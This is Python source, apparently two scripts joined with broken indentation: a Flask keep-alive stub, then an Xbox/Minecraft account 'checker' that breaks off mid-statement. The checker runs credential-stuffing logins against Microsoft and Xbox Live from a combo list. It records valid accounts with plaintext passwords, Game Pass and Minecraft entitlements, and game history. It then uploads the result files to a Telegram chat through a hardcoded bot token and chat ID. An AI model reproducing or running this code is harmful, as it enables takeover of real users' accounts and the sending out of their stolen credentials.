import os
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "Bot is active!"

def run():
    # استخدام الـ Port الذي توفره منصة Render تلقائياً
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

if __name__ == "__main__":
    keep_alive()
    # هنا تضع كود تشغيل البوت الخاص بك (مثلاً bot.infinity_polling())

  import os
import sys
import time
import requests
import re
import threading
from urllib.parse import urlparse, parse_qs
import urllib3
import concurrent.futures
from requests.adapters import HTTPAdapter
import json
from datetime import datetime

urllib3.disable_warnings()

if os.name == 'nt':
    os.system('color')

GRAY = "\033[1;90m"
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
CYAN = "\033[1;96m"
MAGENTA = "\033[1;35m"
WHITE = "\033[1;97m"
RESET = "\033[0m"

LINE = GRAY + "-------------------------------------------------------------------" + RESET

checked = 0
total_combos = 0
hits = 0
bad = 0
twofa = 0
errors = 0
gamepass_count = 0
minecraft_count = 0
gscore_count = 0
account_counter = 0  # لترقيم الحسابات
start_time = 0
is_running = True

file_lock = threading.Lock()
stats_lock = threading.Lock()

# ============================================
# ✅ ضع التوكن والايدي هنا مباشرة
# ============================================
BOT_TOKEN = "6630800841:AAERR7Rw0X_lNo3JnAr5lkoN1nkKZXCe7hw"  # توكن البوت
CHAT_ID = "705071845"    # ايدي الشات
# ============================================

DELAY_BETWEEN_CHECKS = 2
REQUEST_TIMEOUT = 20

# --- متغيرات الجلسة ---
session_folder = ""
session_files = []
session_start_time = None

def format_file_size(size_bytes):
    """تنسيق حجم الملف بطريقة مقروءة"""
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.1f} MB"

def setup_folders():
    global session_folder, session_start_time
    if not os.path.exists("XBOX_RESULT"):
        os.makedirs("XBOX_RESULT")
    
    # إنشاء مجلد للجلسة الحالية
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    session_folder = os.path.join("XBOX_RESULT", f"Session_{timestamp}")
    os.makedirs(session_folder, exist_ok=True)
    session_start_time = time.time()

def save_formatted_account(filename, account_data):
    """
    تكتب الحساب بتنسيق متعدد الأسطر في الملف المحدد.
    account_data: قاموس يحتوي على المفاتيح المطلوبة.
    """
    global account_counter, session_files
    with file_lock:
        account_counter += 1
        filepath = os.path.join(session_folder, filename)
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write("_________________________________________________________\n")
            f.write(f"Account number: {account_counter}\n")
            f.write(f"Email: {account_data['email']}\n")
            f.write(f"Password: {account_data['password']}\n")
            f.write(f"Gamerscore: {account_data['gamerscore']}G\n")
            f.write(f"GamePass: {account_data['gamepass']}\n")
            f.write(f"Minecraft: {account_data['minecraft']}\n")
            f.write(f"Purchases: {account_data['purchases_count']} items\n")
            if account_data['purchases_list']:
                for item in account_data['purchases_list']:
                    f.write(f"  - {item}\n")
            f.write(f"Tool by @zx_dx2\n")
            f.write("_________________________________________________________\n\n")
        
        # تتبع الملفات التي تم إنشاؤها
        if filename not in session_files:
            session_files.append(filename)

def send_file_to_telegram(file_path, caption=None):
    """إرسال ملف إلى تليجرام مع إمكانية إضافة كابشن"""
    if not BOT_TOKEN or not CHAT_ID:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID}
            if caption:
                data['caption'] = caption
            response = requests.post(url, files=files, data=data, timeout=30)
            return response.status_code == 200
    except Exception as e:
        print(f"{RED} [!] خطأ في إرسال الملف: {e}{RESET}")
        return False

def send_text_to_telegram(text):
    """إرسال نص إلى تليجرام"""
    if not BOT_TOKEN or not CHAT_ID:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': CHAT_ID,
            'text': text,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"{RED} [!] خطأ في إرسال النص: {e}{RESET}")
        return False

def send_session_results():
    """إرسال نتائج الجلسة إلى تليجرام بنفس تنسيق الصورة"""
    if not BOT_TOKEN or not CHAT_ID:
        print(f"{YELLOW} [!] لم يتم إعداد توكن البوت أو الايدي، تخطي الإرسال{RESET}")
        return
    
    print(f"\n{YELLOW} [*] جاري إرسال النتائج إلى تليجرام...{RESET}")
    
    # الحصول على وقت الجلسة للتنسيق
    session_time = datetime.fromtimestamp(session_start_time).strftime("%H:%M")
    
    # قائمة الملفات التي سيتم إرسالها مع أحجامها
    files_to_send = []
    for filename in session_files:
        file_path = os.path.join(session_folder, filename)
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            size_bytes = os.path.getsize(file_path)
            size_str = format_file_size(size_bytes)
            files_to_send.append({
                'name': filename,
                'path': file_path,
                'size': size_str,
                'time': session_time
            })
    
    # إرسال كل ملف على حدة مع كابشن مثل الصورة
    sent_count = 0
    for file_info in files_to_send:
        # تنسيق الكابشن مثل الصورة: اسم الملف + الحجم + الوقت
        caption = f"{file_info['name']}\n{file_info['size']} TXT\n{file_info['time']}"
        
        print(f"{GRAY} [*] إرسال: {file_info['name']} ({file_info['size']}){RESET}")
        if send_file_to_telegram(file_info['path'], caption):
            sent_count += 1
            time.sleep(0.5)  # تجنب الحظر
    
    # إرسال ملخص النتائج بعد الملفات
    summary = f"""<b>📊 ملخص فحص XBOX</b>

✅ <b>تم الفحص:</b> {checked} / {total_combos}
🎯 <b>Hits:</b> {hits}
❌ <b>Bad:</b> {bad}
🔐 <b>2FA:</b> {twofa}
⚠️ <b>Errors:</b> {errors}

🏆 <b>Game Pass:</b> {gamepass_count}
⛏️ <b>Minecraft:</b> {minecraft_count}
⭐ <b>G-Score:</b> {gscore_count}

📁 <b>المجلد:</b> {os.path.basename(session_folder)}
⏱️ <b>المدة:</b> {int(time.time() - start_time)} ثانية
    """
    
    time.sleep(0.5)
    send_text_to_telegram(summary)
    
    print(f"{GREEN} [+] تم إرسال {sent_count} ملف إلى تليجرام{RESET}")

def get_cpm():
    elapsed = time.time() - start_time
    if elapsed > 2:
        return int((checked / elapsed) * 60)
    return 0

def update_ui():
    sys.stdout.write("\033[?25l")
    os.system('cls' if os.name == 'nt' else 'clear')

    while is_running:
        cpm = get_cpm()
        percent = (checked / total_combos * 100) if total_combos > 0 else 0.0

        ui_text = f"""\033[H\033[K{LINE}

\033[K{WHITE} Checked : {CYAN}{checked}{WHITE}/{CYAN}{total_combos} {GRAY}| {WHITE}Hits: {GREEN}{hits} {GRAY}| {WHITE}Bad: {RED}{bad}{RESET}
\033[K{WHITE} Errors  : {RED}{errors} {GRAY}| {WHITE}2FA: {YELLOW}{twofa} {GRAY}| {WHITE}CPM: {MAGENTA}{cpm}{RESET}
\033[K{LINE}
\033[K{WHITE} – GAME PASS: {GREEN}{gamepass_count} {RESET}
\033[K{WHITE} – MINECRAFT: {GREEN}{minecraft_count} {RESET}
\033[K{WHITE} – G-SCORE  : {GREEN}{gscore_count}{RESET}
\033[K{LINE}
\033[K{WHITE} Status : {GREEN}{percent:.1f}%{RESET}
\033[K{LINE}
\033[K{GRAY} Programmer: @zx_dx2{RESET}
\033[K{YELLOW} Delay: {DELAY_BETWEEN_CHECKS}s | Slow Mode Active{RESET}
\033[K{WHITE} Session: {os.path.basename(session_folder)}{RESET}
"""
        sys.stdout.write(ui_text)
        sys.stdout.flush()
        time.sleep(0.3)

def check_account(combo):
    global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count

    parts = combo.split(':')
    if len(parts) < 2:
        with stats_lock:
            bad += 1
            checked += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)

    for attempt in range(3):
        session = requests.Session()
        session.verify = False
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })

        try:
            sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
            resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
            text = resp.text

            sftag_match = re.search(r'value=\\\"(.+?)\\\"', text) or re.search(r'value="(.+?)"', text)
            url_match = re.search(r'"urlPost":"(.+?)"', text) or re.search(r"urlPost:'(.+?)'", text)

            if not sftag_match or not url_match:
                with stats_lock:
                    bad += 1
                    checked += 1
                return

            sftag = sftag_match.group(1)
            url_post = url_match.group(1)

            login_data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)

            ms_token = None
            login_text = login_req.text.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match"]):
                with stats_lock:
                    bad += 1
                    checked += 1
                return
            elif any(x in login_text for x in ["recover", "account.live.com/identity/confirm", "email/confirm", "abuse", "locked", "help us protect"]):
                with stats_lock:
                    twofa += 1
                    checked += 1
                return
            elif 'cancel?mkt=' in login_text:
                try:
                    ipt_match = re.search(r'"ipt" value="(.+?)"', login_req.text)
                    pprid_match = re.search(r'"pprid" value="(.+?)"', login_req.text)
                    uaid_match = re.search(r'"uaid" value="(.+?)"', login_req.text)
                    action_match = re.search(r'id="fmHF" action="(.+?)"', login_req.text)

                    if ipt_match and pprid_match and uaid_match and action_match:
                        data2 = {'ipt': ipt_match.group(1), 'pprid': pprid_match.group(1), 'uaid': uaid_match.group(1)}
                        ret = session.post(action_match.group(1), data=data2, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        return_url = re.search(r'"returnUrl":"(.+?)"', ret.text)
                        if return_url:
                            fin = session.get(return_url.group(1), allow_redirects=True, timeout=REQUEST_TIMEOUT)
                            ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                except:
                    pass

            if not ms_token:
                with stats_lock:
                    bad += 1
                    checked += 1
                return

            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)

            if xb_req.status_code != 200:
                raise Exception("Xbox Auth Error")

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            gamertag = "N/A"
            gamerscore = "0"
            gscore_int = 0
            xuid = None
            xsts_xb_token = None

            # ---- Get profile and xuid ----
            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
                    if prof_req.status_code == 200:
                        data = prof_req.json()
                        settings = data.get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag':
                                gamertag = s['value']
                            if s['id'] == 'Gamerscore':
                                gamerscore = s['value']
                                try:
                                    gscore_int = int(gamerscore)
                                except:
                                    gscore_int = 0
                        xuid = data.get('profileUsers', [{}])[0].get('id')
            except:
                pass

            # ---- Check Minecraft entitlements (Game Pass / Minecraft) ----
            has_gp = False
            has_mc = False
            gp_type = "none"
            mc_ent_text = ""

            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)
                if xsts_mc_req.status_code == 200:
                    xsts_mc_token = xsts_mc_req.json()['Token']
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"},
                                           headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
                    if mc_auth.status_code == 200:
                        mc_token = mc_auth.json().get('access_token')
                        if mc_token:
                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                                  headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
                            if ent_req.status_code == 200:
                                mc_ent_text = ent_req.text
            except:
                pass

            if 'product_game_pass_ultimate' in mc_ent_text:
                gp_type = "Game Pass Ultimate"
                has_gp = True
            elif 'product_game_pass_pc' in mc_ent_text:
                gp_type = "PC Game Pass"
                has_gp = True
            elif 'product_game_pass_console' in mc_ent_text:
                gp_type = "Xbox Game Pass Console"
                has_gp = True

            if not has_gp and 'product_minecraft' in mc_ent_text:
                has_mc = True

            has_gscore = False
            if not has_gp and gscore_int > 0:
                has_gscore = True

            # ---- Fetch achievements (games list) ----
            purchases_list = []
            purchases_count = 0
            if xuid and xsts_xb_token:
                try:
                    ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems=999"
                    ach_resp = session.get(
                        ach_url,
                        headers={
                            "Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}",
                            "x-xbl-contract-version": "2"
                        },
                        timeout=REQUEST_TIMEOUT
                    )
                    if ach_resp.status_code == 200:
                        titles = ach_resp.json().get('titles', [])
                        for t in titles:
                            name = t.get('name', 'Unknown')
                            score = t.get('currentGamerscore', 0)
                            purchases_list.append(f"{name} | {score}G")
                        purchases_count = len(purchases_list)
                except:
                    pass

            # ---- Build account data for formatting ----
            account_data = {
                'email': email,
                'password': password,
                'gamerscore': gamerscore,
                'gamepass': gp_type,
                'minecraft': 'Yes' if has_mc else 'No',
                'purchases_count': purchases_count,
                'purchases_list': purchases_list
            }

            # ---- Save to files ----
            # جميع الحسابات الصحيحة تُحفظ في XBOX-Valid.txt
            save_formatted_account("XBOX-Valid.txt", account_data)

            # حفظ في الفئات الخاصة إن وجدت
            if has_gp:
                save_formatted_account("XBOX-GamePass.txt", account_data)
            if has_mc:
                save_formatted_account("Minecraft-Hits.txt", account_data)
            if has_gscore:
                save_formatted_account("G-Score-Hits.txt", account_data)

            # ---- Update global counters ----
            with stats_lock:
                if has_gp or has_mc or has_gscore:
                    hits += 1
                    if has_gp:
                        gamepass_count += 1
                    if has_mc:
                        minecraft_count += 1
                    if has_gscore:
                        gscore_count += 1
                else:
                    bad += 1  # حساب صحيح لكن بدون فئات خاصة
                checked += 1

            time.sleep(DELAY_BETWEEN_CHECKS)
            return

        except requests.exceptions.RequestException:
            time.sleep(1)
        except Exception:
            time.sleep(0.5)
        finally:
            if session:
                session.close()

    with stats_lock:
        errors += 1
        checked += 1

def main():
    global total_combos, start_time, is_running, account_counter

    setup_folders()
    account_counter = 0

    os.system('cls' if os.name == 'nt' else 'clear')
    print(LINE)
    print(GREEN + " — XBOX + MINECRAFT CHECKER (SLOW MODE)" + RESET)
    print(WHITE + " — Coded by: @zx_dx2" + RESET)
    print(YELLOW + f" — Delay: {DELAY_BETWEEN_CHECKS}s between checks" + RESET)
    
    # عرض حالة البوت
    if BOT_TOKEN and CHAT_ID:
        print(GREEN + " — Bot: ✅ Enabled (Auto-send to Telegram)" + RESET)
    else:
        print(YELLOW + " — Bot: ⚠️ Disabled (No token/chat ID)" + RESET)
    
    print(LINE)

    combo_file = input(f"{WHITE} - Enter Combo File Path: {CYAN}").strip()
    print(RESET, end="")

    if not os.path.exists(combo_file):
        print(f"\n{RED} [!] File not found!{RESET}")
        return

    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]

    total_combos